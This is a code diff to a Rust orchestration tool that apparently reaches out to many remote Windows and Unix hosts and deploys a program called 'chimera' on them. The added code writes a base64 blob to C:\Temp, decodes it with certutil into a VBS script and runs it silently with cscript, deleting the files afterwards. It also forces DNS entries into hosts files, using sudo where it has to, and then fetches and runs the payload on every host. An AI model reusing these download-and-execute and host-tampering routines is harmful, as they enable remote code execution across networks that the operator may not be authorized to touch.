@@ -2,7 +2,7 @@ use tokio::io::AsyncWriteExt;
 use std::collections::HashMap;
 use std::net::IpAddr;
 use crate::communicator::{
-    unix_config, windows_config, Communicator, HostOperationResult, OSConfig, ClientWrapper,
+    self, unix_config, windows_config, ClientWrapper, Communicator, HostOperationResult, OSConfig
 };
 use crate::enumerator::{Enumerator, Subnet};
 use crate::types::{Host, OS};
@@ -404,7 +404,8 @@ impl Orchestrator {
 
         // Generate the full command
         format!(
-            "cmd.exe /c \"echo {} > encoded.b64 && certutil -decode encoded.b64 dl.vbs && cscript //B dl.vbs && del dl.vbs encoded.b64\"",
+            "cmd.exe /c \"echo {} > C:\\Temp\\encoded.b64 && certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\dl.vbs && cscript //D //B C:\\Temp\\dl.vbs && del C:\\Temp\\dl.vbs C:\\Temp\\encoded.b64\"",
+            //"cmd.exe /c \"echo {} > encoded.b64 && certutil -decode encoded.b64 dl.vbs",
             encoded
         )
     }
@@ -491,8 +492,9 @@ impl Orchestrator {
 
     async fn download_chimera_win(&self, communicator: &Communicator, host_map: &HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)> {
        // Create temp directory
-       let mkdir_cmd = "cmd.exe /c md C:\\Temp";
+       let mkdir_cmd = "cmd.exe /c md C:\\Temp && w32tm /resync";
        let mkdir_results = communicator.exec_by_os(&cmd!(mkdir_cmd), OS::Windows).await;
+
        
        // Only proceed with download for hosts where mkdir succeeded
        let successful_mkdir_ips: Vec<String> = mkdir_results.iter()
@@ -504,9 +506,20 @@ impl Orchestrator {
            return vec![];
        }
 
+       
+
        // Generate and execute the base64 download command
        let download_cmd = Self::generate_base64_download_command(CHIMERA_URL_WIN);
+
+       info!("Running download command: {}", download_cmd);
        let download_results = communicator.exec_by_os(&cmd!(download_cmd), OS::Windows).await;
+
+
+       for download_result in &download_results {
+           if &download_result.ip == "10.100.136.111" {
+               info!("mkdir result: {:?}", download_result);
+           }
+       }
        
        // Filter download results to only include hosts where mkdir succeeded
        let filtered_results: Vec<HostOperationResult<CommandOutput>> = download_results
@@ -516,6 +529,68 @@ impl Orchestrator {
 
        // Only return the download results
        log_host_results(filtered_results, &host_map, "chimera download")
+    }
+
+    async fn append_to_hosts_file(&self, communicator: &Communicator, os: OS) -> Vec<HostOperationResult<CommandOutput>> {
+        let hosts_file = match os {
+            OS::Windows => "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            OS::Unix => "/etc/hosts",
+            OS::Unknown => return Vec::new(),
+        };
+
+        let mut final_results = Vec::new();
+        
+        match os {
+            OS::Unix => {
+                let command = format!(
+                    r#"[ -w {} ] && echo -e "140.82.116.4 github.com\n185.199.108.133 objects.githubusercontent.com\n185.199.109.133 objects.githubusercontent.com\n185.199.110.133 objects.githubusercontent.com\n185.199.111.133 objects.githubusercontent.com" >> {} || sudo sh -c 'echo -e "140.82.116.4 github.com\n185.199.108.133 objects.githubusercontent.com\n185.199.109.133 objects.githubusercontent.com\n185.199.110.133 objects.githubusercontent.com\n185.199.111.133 objects.githubusercontent.com" >> {}'"#,
+                    hosts_file, hosts_file, hosts_file
+                );
+                final_results.extend(communicator.exec_by_os(&cmd!(command), os).await);
+            },
+            OS::Windows => {
+                let entries = [
+                    "140.82.116.4 github.com",
+                    "185.199.108.133 objects.githubusercontent.com",
+                    "185.199.109.133 objects.githubusercontent.com", 
+                    "185.199.110.133 objects.githubusercontent.com",
+                    "185.199.111.133 objects.githubusercontent.com",
+                    "13.107.246.71 download.sysinternals.com"
+                ];
+
+                for entry in entries {
+                    let results = communicator
+                        .exec_by_os(&cmd!(format!("echo {} >> {}", entry, hosts_file)), os)
+                        .await;
+
+                    if results.is_empty() {
+                        info!("No hosts available for hosts file append");
+                    }
+
+
+                    for result in &results {
+                        if let Err(e) = &result.result {
+                            log_failure(&result.ip, "hosts file append", e);
+                        }
+
+                        if let Ok(output) = &result.result {
+                            info!("[{}] hosts file append succeeded\nstdout: {}\nstderr: {}", 
+                                result.ip,
+                                String::from_utf8_lossy(&output.stdout),
+                                String::from_utf8_lossy(&output.stderr)
+                            );
+                        }
+                    }
+
+
+                    
+                    final_results.extend(results);
+                }
+            },
+            OS::Unknown => (),
+        }
+
+        final_results
     }
 
     async fn download_chimera_unix(&self, communicator: &Communicator, host_map: &HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)> {
@@ -529,16 +604,6 @@ impl Orchestrator {
             for tool in tools {
                 if let Ok(output) = Self::check_tool_exists(client, tool).await {
                     if !String::from_utf8_lossy(&output.stdout).trim().is_empty() {
-                        let _ = client.exec(&cmd!("echo \"140.82.116.4 github.com\" >> /etc/hosts")).await;
-                        let _ = client.exec(&cmd!("echo \"185.199.108.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
-                        let _ = client.exec(&cmd!("echo \"185.199.109.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
-                        let _ = client.exec(&cmd!("echo \"185.199.110.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
-                        let _ = client.exec(&cmd!("echo \"185.199.111.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
-
-                        /*
-                        let result = client.exec(&cmd!("cat /etc/hosts")).await.unwrap();
-                        info!("Hosts file: {}", String::from_utf8_lossy(&result.stdout));
-                        */
 
                         let cmd = Self::generate_download_command(tool, CHIMERA_URL_UNIX);
                         log::info!("[{}] Attempting download with {}: {}", ip, tool, cmd);
@@ -653,6 +718,9 @@ impl Orchestrator {
             Some(comm) => comm,
             None => return Err(Error::CommandError("Communicator not initialized".into())),
         };
+
+        let _ = self.append_to_hosts_file(&communicator, OS::Unix).await;
+        let _ = self.append_to_hosts_file(&communicator, OS::Windows).await;
 
         let deployment_results = self.download_chimera(&communicator, host_map).await;
         let deployed_hosts: Vec<Arc<Host>> = {
